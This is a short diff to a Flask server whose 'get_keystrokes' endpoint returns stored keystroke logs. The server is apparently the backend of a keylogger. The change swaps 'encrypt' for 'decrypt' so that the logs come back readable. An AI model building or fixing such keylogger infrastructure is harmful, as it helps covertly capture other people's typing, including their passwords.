@@ -2,7 +2,7 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 import os, random,string
 import time
-from ToolBox import merge_dicts,encrypt
+from ToolBox import merge_dicts,decrypt
 import os, json, time
 
 app = Flask(__name__)
@@ -111,7 +111,7 @@ def get_keystrokes():
 
             except Exception as e:
                 return jsonify({"error":"logs not found"}),400
-        decrypt_data = {encrypt(key,k): encrypt(key,v) for k, v in key_logs.items()}
+        decrypt_data = {decrypt(key,k): decrypt(key,v) for k, v in key_logs.items()}
         return jsonify({"logs":decrypt_data}), 200
 
     except Exception as e:
